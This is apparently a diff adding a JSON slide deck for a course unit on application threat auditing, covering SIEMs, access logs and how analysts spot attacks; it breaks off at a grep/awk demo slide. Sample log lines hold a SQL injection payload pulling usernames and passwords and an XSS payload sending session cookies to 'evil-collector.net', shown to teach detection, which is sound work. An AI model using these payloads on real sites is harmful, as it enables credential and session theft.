@@ -1,0 +1,1887 @@
+{
+ "subunit_id": "5.6",
+ "subunit_title": "Application Threat Auditing",
+ "unit": "5",
+ "unit_title": "Unit 5: Securing Applications and Data",
+ "learning_objectives": [],
+ "slides": [
+  {
+   "index": "5.6.1.a.1",
+   "parent_n": 1,
+   "title": "Prevention Will Fail: The Premise of Auditing",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "application-threat-auditing",
+    "nist-800-92",
+    "detection-vs-prevention"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This is the analyst-facing half of the pipeline Unit 4's logging infrastructure enables, Unit 4 asked how to collect logs at scale, 5.6 asks what to look for once they exist.</p><p><b>Misconception:</b> Students often think 'we have a firewall, so we don't need logging.' Auditing exists precisely because prevention cannot cover every case, including insider abuse of legitimate access.</p><p><b>Analogy:</b> A firewall is a locked door; auditing is the security camera footage you review after assuming someone eventually picks the lock.</p><p><b>Exam tip:</b> If a scenario asks 'was this organization secure' despite having prevention tools, look for whether detection/auditing controls existed too.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Core premise:</b> Every mature security program assumes prevention eventually fails, a zero-day, a phished credential, a misconfigured API",
+    "<b>Application threat auditing:</b> Continuously reviewing application-layer evidence (logs, file states, behavioral baselines) to detect exploitation already occurred or in progress",
+    "<b>The question it answers:</b> Not 'how do we stop the attacker' but 'did something get through, and what did it do?'",
+    "<b>Framework home:</b> NIST SP 800-92 (log management); underpins the Detect function (DE.CM) of the NIST Cybersecurity Framework",
+    "<b>Three evidentiary sources:</b> Logs, file integrity monitoring, and anomaly detection, each catches something the others miss"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.1.a.1",
+   "parent_n": 1,
+   "title": "Prevention Will Fail: The Premise of Auditing",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "application-threat-auditing",
+    "nist-800-92",
+    "detection-vs-prevention"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This is the analyst-facing half of the pipeline Unit 4's logging infrastructure enables, Unit 4 asked how to collect logs at scale, 5.6 asks what to look for once they exist.</p><p><b>Misconception:</b> Students often think 'we have a firewall, so we don't need logging.' Auditing exists precisely because prevention cannot cover every case, including insider abuse of legitimate access.</p><p><b>Analogy:</b> A firewall is a locked door; auditing is the security camera footage you review after assuming someone eventually picks the lock.</p><p><b>Exam tip:</b> If a scenario asks 'was this organization secure' despite having prevention tools, look for whether detection/auditing controls existed too.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Perimeter defenses, firewalls, network segmentation, access control lists, are designed to keep adversaries out. But every mature security program operates on the assumption that prevention will eventually fail: a zero-day will be weaponized, a credential will be phished, a misconfigured API will be exposed. Application threat auditing is the academic and operational discipline built around that assumption. Rather than asking 'how do we stop the attacker,' it asks 'how do we prove, from the evidence an application leaves behind, that an attacker was here, and what did they touch?'</p>",
+    "<p>This discipline sits at the intersection of three evidentiary sources: application/web server logs (the literal strings attackers send), file integrity monitoring (proof of what changed on disk), and anomaly detection (statistical deviation from a behavioral baseline). Each covers a blind spot the other two share.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.1.a.1",
+   "parent_n": 1,
+   "title": "Prevention Will Fail: The Premise of Auditing",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "application-threat-auditing",
+    "nist-800-92",
+    "detection-vs-prevention"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This is the analyst-facing half of the pipeline Unit 4's logging infrastructure enables, Unit 4 asked how to collect logs at scale, 5.6 asks what to look for once they exist.</p><p><b>Misconception:</b> Students often think 'we have a firewall, so we don't need logging.' Auditing exists precisely because prevention cannot cover every case, including insider abuse of legitimate access.</p><p><b>Analogy:</b> A firewall is a locked door; auditing is the security camera footage you review after assuming someone eventually picks the lock.</p><p><b>Exam tip:</b> If a scenario asks 'was this organization secure' despite having prevention tools, look for whether detection/auditing controls existed too.</p>",
+   "beat": 3,
+   "bullets": [],
+   "content_blocks": [],
+   "diagram_ref": "three_evidentiary_sources",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.1.a.2",
+   "parent_n": 2,
+   "title": "Detection Is a Different Job Than Prevention",
+   "slide_type": "deep_question",
+   "difficulty": "foundational",
+   "tags": [
+    "prevention-vs-detection",
+    "waf",
+    "professors-note"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This directly mirrors the chapter's Professor's Note callout, treat it as a load-bearing exam concept, not a throwaway distinction.</p><p><b>Misconception:</b> 'We have a firewall, so we don't need logging' is explicitly called out as a losing mental model on the AP exam.</p><p><b>Analogy:</b> A vaccine (prevention) versus a diagnostic blood test (detection), you want both, and one never substitutes for the other.</p><p><b>Exam tip:</b> Practice labeling described controls as 'prevention' or 'detection', this is a recurring question type across Unit 5.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Prevention:</b> Stops a known-bad pattern before it executes (e.g., a WAF blocking a payload)",
+    "<b>Detection/auditing:</b> Assumes prevention already failed somewhere, a WAF rule missed a variant, a zero-day was used, an insider abused legitimate access",
+    "<b>Common student error:</b> Conflating 'the WAF blocked it' with 'we have detection'",
+    "<b>Why it matters for the exam:</b> A firewall rule cannot substitute for log review, FIM, or behavioral baselining",
+    "<b>Mental model check:</b> If your answer to 'why are we secure' is only a list of prevention tools, you are missing half the picture"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.1.a.2",
+   "parent_n": 2,
+   "title": "Detection Is a Different Job Than Prevention",
+   "slide_type": "deep_question",
+   "difficulty": "foundational",
+   "tags": [
+    "prevention-vs-detection",
+    "waf",
+    "professors-note"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This directly mirrors the chapter's Professor's Note callout, treat it as a load-bearing exam concept, not a throwaway distinction.</p><p><b>Misconception:</b> 'We have a firewall, so we don't need logging' is explicitly called out as a losing mental model on the AP exam.</p><p><b>Analogy:</b> A vaccine (prevention) versus a diagnostic blood test (detection), you want both, and one never substitutes for the other.</p><p><b>Exam tip:</b> Practice labeling described controls as 'prevention' or 'detection', this is a recurring question type across Unit 5.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Students often conflate a Web Application Firewall (WAF) blocking a request with 'detection.' They are related but distinct disciplines. Prevention stops a known-bad pattern before it executes. Auditing assumes prevention already failed somewhere, maybe the WAF rule didn't cover this payload variant, maybe the attacker used a zero-day, maybe it was an authorized insider abusing legitimate access that no firewall rule would ever block.</p>",
+    "<p>Auditing is the forensic and monitoring layer that exists precisely because you cannot prevent everything. This distinction is one of the most heavily tested framing ideas in this topic.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.1.a.3",
+   "parent_n": 3,
+   "title": "Signature-Based Detection vs. Behavioral Baselining",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "signature-based-detection",
+    "behavioral-baselining",
+    "soc",
+    "ueba"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Signature engines like Snort/Suricata and WAF rule sets (OWASP CRS) are the classic signature-based tools; UEBA platforms and SIEM anomaly modules implement behavioral baselining.</p><p><b>Misconception:</b> Students assume one detection method is strictly 'better.' Neither is sufficient alone, they cover different attack shapes.</p><p><b>Analogy:</b> A metal detector at an airport (signature) versus a TSA behavioral-detection officer watching for nervous passengers (baseline), different threats, different tools.</p><p><b>Exam tip:</b> If a scenario describes a known malicious string, think signature. If it describes volume/timing/geography with no obvious bad string, think baseline.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Signature-based detection:</b> Matches observed data against known-malicious patterns, fast, low false-positive, but blind to novel attacks",
+    "<b>Behavioral baselining:</b> Statistical model of 'normal' (request volume, geography, access patterns) so deviations become measurable",
+    "<b>Worked contrast:</b> A SQLi string <code>' OR '1'='1</code> is caught instantly by signature; a slow nightly exfiltration under any alert threshold is only caught by baseline comparison",
+    "<b>Theoretical root:</b> Behavioral baselining is grounded in statistical process control (Shewhart, 1931)",
+    "<b>Mature SOC design:</b> Runs both approaches in parallel because each covers the other's blind spot"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.1.a.3",
+   "parent_n": 3,
+   "title": "Signature-Based Detection vs. Behavioral Baselining",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "signature-based-detection",
+    "behavioral-baselining",
+    "soc",
+    "ueba"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Signature engines like Snort/Suricata and WAF rule sets (OWASP CRS) are the classic signature-based tools; UEBA platforms and SIEM anomaly modules implement behavioral baselining.</p><p><b>Misconception:</b> Students assume one detection method is strictly 'better.' Neither is sufficient alone, they cover different attack shapes.</p><p><b>Analogy:</b> A metal detector at an airport (signature) versus a TSA behavioral-detection officer watching for nervous passengers (baseline), different threats, different tools.</p><p><b>Exam tip:</b> If a scenario describes a known malicious string, think signature. If it describes volume/timing/geography with no obvious bad string, think baseline.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>The theoretical backbone of log-based detection is signature-based detection contrasted against behavioral baselining. A SQL injection attempt containing <code>' OR '1'='1</code> can be caught by a signature the moment it appears in a log line. A compromised service account slowly exfiltrating one megabyte of customer data per night, staying under any single alert threshold, will never trip a signature, it can only be caught by comparing this week's behavior to months of established baseline.</p>",
+    "<p>A mature Security Operations Center (SOC) runs both approaches in parallel, because each covers the other's blind spot. This pairing is the conceptual foundation for everything else in the chapter.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.1.a.4",
+   "parent_n": 4,
+   "title": "SOC, Log Aggregation, and the SIEM",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "siem",
+    "log-aggregation",
+    "correlation",
+    "soc"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Common shipping tools: Filebeat, Fluentd, syslog-ng over RFC 5424 syslog transport. Correlation rules are frequently built against MITRE ATT&CK technique mappings.</p><p><b>Misconception:</b> Students think a SIEM is 'just a big log archive.' The correlation engine, not storage, is what makes it valuable.</p><p><b>Analogy:</b> A SIEM is a detective's case board, pinning disparate clues (a log line, a file change, a spike in traffic) together into one narrative thread.</p><p><b>Exam tip:</b> Know that correlation across sources, not single-source alerting, is what a SIEM is built to do.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Scale problem:</b> A single server can generate tens of thousands of log lines/hour; enterprises generate volumes no human can review manually",
+    "<b>Log aggregation:</b> Collecting logs from distributed sources into one centralized, normalized, searchable store",
+    "<b>SIEM:</b> Security Information and Event Management platform, ingests, normalizes, and correlates logs from across the org",
+    "<b>Correlation is the value-add:</b> Not just storage, joining a suspicious log line, a file hash mismatch, and a behavioral outlier at the same timestamp",
+    "<b>SOC structure:</b> Tiered team (Tier 1 triage, Tier 2 investigation, Tier 3 threat hunting) executing the NIST SP 800-61 incident lifecycle"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.1.a.4",
+   "parent_n": 4,
+   "title": "SOC, Log Aggregation, and the SIEM",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "siem",
+    "log-aggregation",
+    "correlation",
+    "soc"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Common shipping tools: Filebeat, Fluentd, syslog-ng over RFC 5424 syslog transport. Correlation rules are frequently built against MITRE ATT&CK technique mappings.</p><p><b>Misconception:</b> Students think a SIEM is 'just a big log archive.' The correlation engine, not storage, is what makes it valuable.</p><p><b>Analogy:</b> A SIEM is a detective's case board, pinning disparate clues (a log line, a file change, a spike in traffic) together into one narrative thread.</p><p><b>Exam tip:</b> Know that correlation across sources, not single-source alerting, is what a SIEM is built to do.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Centralizing evidentiary streams is not optional at scale. This is the motivating problem behind log aggregation and the rise of the Security Information and Event Management (SIEM) platform as the field's central tool. A SIEM's value is not merely storage, it is correlation: joining a suspicious log line on one server with a file hash mismatch on another and a behavioral outlier on a third, at the same timestamp, to reconstruct the narrative of an attack that no single data source could tell alone.</p>",
+    "<p>Gartner coined 'SIEM' in 2005, merging Security Information Management (SIM) and Security Event Management (SEM). Modern examples include Splunk Enterprise Security, Microsoft Sentinel, and Elastic Security.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.1.a.5",
+   "parent_n": 5,
+   "title": "Section I Glossary Consolidation",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "glossary",
+    "section-1-review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Use this slide as a checkpoint before moving into the technical mechanics of logs, FIM, and anomaly correlation.</p><p><b>Misconception:</b> None new here, this is a consolidation checkpoint, not a new concept.</p><p><b>Analogy:</b> Think of this as the chapter's 'table of tools' before you learn how each one is actually operated.</p><p><b>Exam tip:</b> Be able to define each term in one sentence without notes before continuing.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Application threat auditing:</b> Reviewing app-layer evidence to detect exploitation that already occurred or is in progress",
+    "<b>Signature-based detection:</b> Matching against known-malicious patterns",
+    "<b>Behavioral baselining:</b> Statistical model of normal, alerting on deviation",
+    "<b>Log aggregation / SIEM:</b> Centralized collection and cross-source correlation of evidence",
+    "<b>SOC:</b> The tiered team executing detection, triage, escalation, and response"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.1.a.5",
+   "parent_n": 5,
+   "title": "Section I Glossary Consolidation",
+   "slide_type": "concept",
+   "difficulty": "foundational",
+   "tags": [
+    "glossary",
+    "section-1-review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Use this slide as a checkpoint before moving into the technical mechanics of logs, FIM, and anomaly correlation.</p><p><b>Misconception:</b> None new here, this is a consolidation checkpoint, not a new concept.</p><p><b>Analogy:</b> Think of this as the chapter's 'table of tools' before you learn how each one is actually operated.</p><p><b>Exam tip:</b> Be able to define each term in one sentence without notes before continuing.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Section I established the conceptual foundation: application threat auditing is the discipline that assumes prevention has already failed and asks what evidence proves it. Its two core detection philosophies, signature-based matching and behavioral baselining, are complementary, and both feed into a centralized SIEM operated by a SOC. This vocabulary underlies every mechanism covered in Section II.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.a.1",
+   "parent_n": 6,
+   "title": "Access Logs: The Literal Fingerprint of an Attack",
+   "slide_type": "mechanism",
+   "difficulty": "foundational",
+   "tags": [
+    "access-log",
+    "clf",
+    "apache",
+    "nginx"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Apache's LogFormat directive and Nginx's log_format directive control what fields are captured; Combined Log Format is the de facto industry standard.</p><p><b>Misconception:</b> Students think logs only capture what the app 'did.' Access logs capture what was <i>requested</i>, independent of the outcome.</p><p><b>Analogy:</b> The access log is a security camera at the front door, it records everyone who walked up, whether or not they got in.</p><p><b>Exam tip:</b> Know CLF vs Combined Log Format and that the request line is stored raw/verbatim.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Access log:</b> Records every HTTP request served, client IP, timestamp, request line, status code, response size",
+    "<b>Formats:</b> Common Log Format (CLF) and extended Combined Log Format (adds referrer/user-agent)",
+    "<b>Default paths:</b> /var/log/apache2/access.log, /var/log/nginx/access.log",
+    "<b>Key insight:</b> Because the raw request string is preserved verbatim, injection payloads leave a textual fingerprint before the app even finishes processing",
+    "<b>Why it precedes app logic:</b> The web server writes the log entry regardless of whether the app-layer code ultimately rejects the request"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.a.1",
+   "parent_n": 6,
+   "title": "Access Logs: The Literal Fingerprint of an Attack",
+   "slide_type": "mechanism",
+   "difficulty": "foundational",
+   "tags": [
+    "access-log",
+    "clf",
+    "apache",
+    "nginx"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Apache's LogFormat directive and Nginx's log_format directive control what fields are captured; Combined Log Format is the de facto industry standard.</p><p><b>Misconception:</b> Students think logs only capture what the app 'did.' Access logs capture what was <i>requested</i>, independent of the outcome.</p><p><b>Analogy:</b> The access log is a security camera at the front door, it records everyone who walked up, whether or not they got in.</p><p><b>Exam tip:</b> Know CLF vs Combined Log Format and that the request line is stored raw/verbatim.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Every request to an Apache or Nginx web server is written to an access log before the application logic even executes. Because the raw request string is preserved verbatim, injection payloads, which must be syntactically valid within the request, appear as recognizable, often ungrammatical fragments inside the URL or query string.</p>",
+    "<p>This makes the access log the single richest and earliest evidentiary source for detecting exploitation attempts, since it captures the attacker's literal input before any downstream processing, filtering, or blocking occurs.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.a.2",
+   "parent_n": 7,
+   "title": "Reading a Real SQL Injection Log Line",
+   "slide_type": "mechanism",
+   "difficulty": "standard",
+   "tags": [
+    "sqli",
+    "union-injection",
+    "access-log",
+    "cve-signature"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> User-Agent strings are trivially spoofable (RFC 9110 §10.1.5), but attackers using automated tools frequently forget to change the default value, leaving a free indicator.</p><p><b>Misconception:</b> Students think a 403/blocked response means 'nothing happened, ignore it.' A 200 on a payload-bearing request is the far more urgent signal.</p><p><b>Analogy:</b> A rejected forged check (blocked) is a policy success; a forged check that cleared the bank (200) demands an immediate investigation.</p><p><b>Exam tip:</b> Memorize the SQLi tells, UNION, SELECT, OR 1=1, quote characters, comment markers (-- or #), and that status 200 elevates severity.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Scenario:</b> A GET request to <code>products.php?id=...UNION SELECT username,password,3 FROM users--</code>",
+    "<b>Signal 1, User-Agent:</b> <code>sqlmap/1.7.2</code> identifies an automated SQLi tool; a real browser never sends this",
+    "<b>Signal 2, UNION-based injection:</b> Appends a UNION SELECT to pull columns (username, password) not meant for this endpoint",
+    "<b>Signal 3, Comment terminator:</b> Trailing <code>--</code> discards the rest of the original query so the injected clause parses cleanly",
+    "<b>Signal 4, Status 200:</b> The request was processed, not rejected, proof the payload was not blocked by a WAF"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.a.2",
+   "parent_n": 7,
+   "title": "Reading a Real SQL Injection Log Line",
+   "slide_type": "mechanism",
+   "difficulty": "standard",
+   "tags": [
+    "sqli",
+    "union-injection",
+    "access-log",
+    "cve-signature"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> User-Agent strings are trivially spoofable (RFC 9110 §10.1.5), but attackers using automated tools frequently forget to change the default value, leaving a free indicator.</p><p><b>Misconception:</b> Students think a 403/blocked response means 'nothing happened, ignore it.' A 200 on a payload-bearing request is the far more urgent signal.</p><p><b>Analogy:</b> A rejected forged check (blocked) is a policy success; a forged check that cleared the bank (200) demands an immediate investigation.</p><p><b>Exam tip:</b> Memorize the SQLi tells, UNION, SELECT, OR 1=1, quote characters, comment markers (-- or #), and that status 200 elevates severity.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Several signals in a single log line justify immediate escalation. The User-Agent string identifies <code>sqlmap</code>, an automated SQL injection exploitation tool, a legitimate browser would never send this. The URL-decoded query string reveals a classic UNION-based injection appending <code>UNION SELECT username,password,3 FROM users--</code> to pull credentials out of a table the application was never meant to expose through this endpoint.</p>",
+    "<p>The trailing double-dash is a SQL comment terminator used to silently discard the rest of the application's original query so the injected clause parses without a syntax error. Notably, the server responded with 200, meaning the request was processed rather than rejected, which is precisely why log-based detection matters even in environments with a WAF: a novel payload variant can slip past filtering rules and only the log record proves it happened.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.a.2",
+   "parent_n": 7,
+   "title": "Reading a Real SQL Injection Log Line",
+   "slide_type": "mechanism",
+   "difficulty": "standard",
+   "tags": [
+    "sqli",
+    "union-injection",
+    "access-log",
+    "cve-signature"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> User-Agent strings are trivially spoofable (RFC 9110 §10.1.5), but attackers using automated tools frequently forget to change the default value, leaving a free indicator.</p><p><b>Misconception:</b> Students think a 403/blocked response means 'nothing happened, ignore it.' A 200 on a payload-bearing request is the far more urgent signal.</p><p><b>Analogy:</b> A rejected forged check (blocked) is a policy success; a forged check that cleared the bank (200) demands an immediate investigation.</p><p><b>Exam tip:</b> Memorize the SQLi tells, UNION, SELECT, OR 1=1, quote characters, comment markers (-- or #), and that status 200 elevates severity.</p>",
+   "beat": 3,
+   "bullets": [],
+   "content_blocks": [],
+   "diagram_ref": "sqli_log_anatomy",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.a.2",
+   "parent_n": 7,
+   "title": "Reading a Real SQL Injection Log Line",
+   "slide_type": "mechanism",
+   "difficulty": "standard",
+   "tags": [
+    "sqli",
+    "union-injection",
+    "access-log",
+    "cve-signature"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> User-Agent strings are trivially spoofable (RFC 9110 §10.1.5), but attackers using automated tools frequently forget to change the default value, leaving a free indicator.</p><p><b>Misconception:</b> Students think a 403/blocked response means 'nothing happened, ignore it.' A 200 on a payload-bearing request is the far more urgent signal.</p><p><b>Analogy:</b> A rejected forged check (blocked) is a policy success; a forged check that cleared the bank (200) demands an immediate investigation.</p><p><b>Exam tip:</b> Memorize the SQLi tells, UNION, SELECT, OR 1=1, quote characters, comment markers (-- or #), and that status 200 elevates severity.</p>",
+   "beat": 4,
+   "bullets": [],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": "",
+   "code_block": {
+    "language": "bash",
+    "content": "203.0.113.44 - - [09/Jul/2026:03:14:22 -0400] \"GET /products.php?id=1%20UNION%20SELECT%20username,password,3%20FROM%20users--%20 HTTP/1.1\" 200 4821 \"-\" \"sqlmap/1.7.2#stable (https://sqlmap.org)\"",
+    "mode": "static"
+   }
+  },
+  {
+   "index": "5.6.2.a.3",
+   "parent_n": 8,
+   "title": "Reading a Reflected XSS Probe",
+   "slide_type": "mechanism",
+   "difficulty": "standard",
+   "tags": [
+    "xss",
+    "reflected-xss",
+    "cookie-theft",
+    "access-log"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> The primary mitigation for cookie theft via XSS is the HttpOnly cookie attribute, which prevents JavaScript from reading document.cookie at all (RFC 6265bis).</p><p><b>Misconception:</b> Students think XSS log lines look like SQLi log lines. XSS log lines contain HTML/JS tags and event handlers (&lt;script&gt;, onerror=, javascript:), not SQL keywords.</p><p><b>Analogy:</b> The payload is a forwarding address slip attached to the victim's mail, silently redirecting their session identity to the attacker.</p><p><b>Exam tip:</b> Be able to mentally decode common percent-encodings (%3C, %3E, %27, %20) when reading a raw log line on the exam.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Scenario:</b> A GET to <code>/search?q=</code> containing a percent-encoded <code>&lt;script&gt;</code> payload",
+    "<b>Decoded payload:</b> <code>document.location='https://evil-collector.net/c?c='+document.cookie</code>",
+    "<b>Purpose:</b> Redirects the victim's browser to an attacker server, appending their session cookie, session cookie theft",
+    "<b>Tool signature:</b> User-Agent <code>XSStrike/3.1</code> is another automated-scanner giveaway",
+    "<b>Encoding awareness:</b> Analysts must mentally decode <code>%3C</code>/<code>%3E</code> as angle brackets and <code>%27</code> as a single quote"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.a.3",
+   "parent_n": 8,
+   "title": "Reading a Reflected XSS Probe",
+   "slide_type": "mechanism",
+   "difficulty": "standard",
+   "tags": [
+    "xss",
+    "reflected-xss",
+    "cookie-theft",
+    "access-log"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> The primary mitigation for cookie theft via XSS is the HttpOnly cookie attribute, which prevents JavaScript from reading document.cookie at all (RFC 6265bis).</p><p><b>Misconception:</b> Students think XSS log lines look like SQLi log lines. XSS log lines contain HTML/JS tags and event handlers (&lt;script&gt;, onerror=, javascript:), not SQL keywords.</p><p><b>Analogy:</b> The payload is a forwarding address slip attached to the victim's mail, silently redirecting their session identity to the attacker.</p><p><b>Exam tip:</b> Be able to mentally decode common percent-encodings (%3C, %3E, %27, %20) when reading a raw log line on the exam.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>A reflected XSS probe looks structurally different from SQLi but follows the same principle of leaving a literal, syntactically telling fragment in the request line. Decoded, the <code>q</code> parameter contains <code>&lt;script&gt;document.location='https://evil-collector.net/c?c='+document.cookie&lt;/script&gt;</code>, a classic session cookie theft payload that redirects the victim's browser to an attacker server, appending their session cookie as a query parameter.</p>",
+    "<p>The tool signature <code>XSStrike</code> in the User-Agent is another automated-scanner giveaway, exactly parallel to sqlmap's signature in the SQLi example.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.a.3",
+   "parent_n": 8,
+   "title": "Reading a Reflected XSS Probe",
+   "slide_type": "mechanism",
+   "difficulty": "standard",
+   "tags": [
+    "xss",
+    "reflected-xss",
+    "cookie-theft",
+    "access-log"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> The primary mitigation for cookie theft via XSS is the HttpOnly cookie attribute, which prevents JavaScript from reading document.cookie at all (RFC 6265bis).</p><p><b>Misconception:</b> Students think XSS log lines look like SQLi log lines. XSS log lines contain HTML/JS tags and event handlers (&lt;script&gt;, onerror=, javascript:), not SQL keywords.</p><p><b>Analogy:</b> The payload is a forwarding address slip attached to the victim's mail, silently redirecting their session identity to the attacker.</p><p><b>Exam tip:</b> Be able to mentally decode common percent-encodings (%3C, %3E, %27, %20) when reading a raw log line on the exam.</p>",
+   "beat": 4,
+   "bullets": [],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": "",
+   "code_block": {
+    "language": "bash",
+    "content": "198.51.100.9 - - [09/Jul/2026:03:16:05 -0400] \"GET /search?q=%3Cscript%3Edocument.location%3D%27https%3A%2F%2Fevil-collector.net%2Fc%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1\" 200 3110 \"-\" \"Mozilla/5.0 (compatible; XSStrike/3.1)\"",
+    "mode": "static"
+   }
+  },
+  {
+   "index": "5.6.2.a.4",
+   "parent_n": 9,
+   "title": "Live Demo: grep/awk Log Hunting for Injection Indicators",
+   "slide_type": "application",
+   "difficulty": "standard",
+   "tags": [
+    "grep",
+    "awk",
+    "log-hunting",
+    "waf-bypass"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This models real analyst workflow, grep for indicators, awk to aggregate by field, then a targeted awk filter joining an indicator condition with a status-code condition.</p><p><b>Misconception:</b> Students think finding any match is itself the alert-worthy event. The status code context (did it succeed?) is what determines urgency.</p><p><b>Analogy:</b> Sorting mail by which envelopes were opened (200) versus returned to sender (403), you investigate the opened ones first.</p><p><b>Exam tip:</b> Be able to explain, in plain English, what a compound grep/awk hunting command is checking for even if you can't write the exact syntax.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Ad-hoc hunting:</b> Analysts rarely wait for a SIEM rule, command-line hunting across raw logs is a core exam-relevant skill",
+    "<b>Sweep command:</b> A single <code>grep -Ei</code> across rotated logs for UNION/SELECT, OR 1=1, comment markers, and script tags",
+    "<b>Tallying noisy IPs:</b> Pipe matches through <code>awk</code> + <code>sort | uniq -c | sort -rn</code> to rank the noisiest scanner source",
+    "<b>High-value pattern:</b> Filter for requests containing an injection indicator AND a 200 status, the successful bypass, not the blocked one",
+    "<b>Takeaway:</b> A blocked attempt (403) is a policy success story; a successful (200) request with an injection signature demands incident response"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.a.4",
+   "parent_n": 9,
+   "title": "Live Demo: grep/awk Log Hunting for Injection Indicators",
+   "slide_type": "application",
+   "difficulty": "standard",
+   "tags": [
+    "grep",
+    "awk",
+    "log-hunting",
+    "waf-bypass"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This models real analyst workflow, grep for indicators, awk to aggregate by field, then a targeted awk filter joining an indicator condition with a status-code condition.</p><p><b>Misconception:</b> Students think finding any match is itself the alert-worthy event. The status code context (did it succeed?) is what determines urgency.</p><p><b>Analogy:</b> Sorting mail by which envelopes were opened (200) versus returned to sender (403), you investigate the opened ones first.</p><p><b>Exam tip:</b> Be able to explain, in plain English, what a compound grep/awk hunting command is checking for even if you can't write the exact syntax.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
